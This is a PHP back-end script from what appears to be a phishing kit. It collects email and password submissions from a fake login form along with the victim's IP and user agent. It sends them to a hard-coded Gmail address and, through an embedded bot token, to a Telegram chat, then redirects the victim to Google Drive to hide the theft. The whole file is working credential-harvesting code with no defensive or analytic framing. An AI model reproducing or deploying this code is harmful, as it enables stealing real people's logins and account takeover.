<?php
// Inclusion des dépendances (si nécessaire)
include 'email.php';

// Récupération et validation des données POST
$email = isset($_POST['email']) ? trim($_POST['email']) : null;
$password = isset($_POST['password']) ? trim($_POST['password']) : null;

// Redirection en cas de succès
$redirect = 'https://drive.google.com/drive/u/0/home'; // Remplacez par l'URL de votre choix

// Validation des champs obligatoires
if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
    // Récupération des informations de l'utilisateur
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Création du message
    $message = "|----------| ArkealoGeNDz |--------------|\n";
    $message .= "Online ID            : " . htmlspecialchars($email) . "\n";
    $message .= "Passcode              : " . htmlspecialchars($password) . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- ArkealoGeNDz --------------|\n";

    // Configuration des informations d'envoi
    $send = "tijobsworkers@gmail.com"; // Remplacez par votre adresse email
    $subject = "Login Attempt from IP: $ip";
    $headers = "From: hosting@juicylucy.cl\r\n" .
               "Reply-To: hosting@juicylucy.cl\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Envoi de l'email et traitement des erreurs
    if (mail($send, $subject, $message, $headers)) {
        // Envoi du message vers Telegram
        send_telegram_msg($message); // Assurez-vous que cette fonction est définie

        $signal = 'ok';
        $msg = 'Message sent successfully';
    } else {
        $signal = 'error';
        $msg = 'Failed to send email.';
    }
} else {
    $signal = 'bad';
    $msg = 'Invalid email format or missing fields.';
}

// Envoi de la réponse en JSON
$data = array(
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => $redirect,
);
header('Content-Type: application/json');
echo json_encode($data);

// Fonction pour envoyer un message Telegram
function send_telegram_msg($message) {
    $botToken = "8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU"; // Remplacez par votre token Telegram
    $chatId = "8179736651"; // Remplacez par votre ID de chat
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Envoi via cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Telegram Error: ' . curl_error($ch));
    }

    curl_close($ch);
}
?>
